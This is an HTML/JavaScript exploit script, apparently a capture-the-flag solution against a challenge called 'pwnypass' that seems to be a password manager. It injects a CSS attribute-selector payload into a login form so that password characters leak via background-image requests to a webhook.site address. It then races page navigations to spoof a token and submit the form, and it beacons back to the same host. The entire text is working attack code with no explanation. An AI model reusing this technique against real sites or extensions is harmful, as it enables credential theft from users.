<script>
sleep = async (ms) => new Promise((res)=>setTimeout(res, ms));

async function main() {
    navigator.sendBeacon('https://webhook.site/894582c1-d070-4b8a-b25f-2385cbf3ba78', 'loaded1');
    spoofWrite1 = async () => {
        w = open('/solve1_2.html');
        await sleep(1000);
        w.eval(`
        sleep = async (ms) => new Promise((res)=>setTimeout(res, ms));
        spoofWrite = async ()=>{
            document.forms[0].username.value = '<style>div[data-password^=uiu]{ background-image: url(https://webhook.site/894582c1-d070-4b8a-b25f-2385cbf3ba78); }</style>';
            document.forms[0].password.value = 'asdf2';
            await sleep(10);
            document.forms[0].username.dispatchEvent(new Event('change'));
            for(var i=0;i<50;i++) {location='https://pwnypass.c.hc.lc/?${Math.random()}'; await new Promise((res)=>setTimeout(res,10));window.stop();}
            console.log('spoofed token');
            document.forms[0].dispatchEvent(new Event('submit'));
            for(var i=0;i<50;i++) {location='https://pwnypass.c.hc.lc/?${Math.random()}'; await new Promise((res)=>setTimeout(res,10));window.stop();}
        };
        spoofWrite();
        `);
        await sleep(2000);
    }
    // just try a few times lol
    await spoofWrite1();
    await spoofWrite1();
    await spoofWrite1();
    await spoofWrite1();

    open('https://pwnypass.c.hc.lc/login.php');
    
    
}
main();



</script>
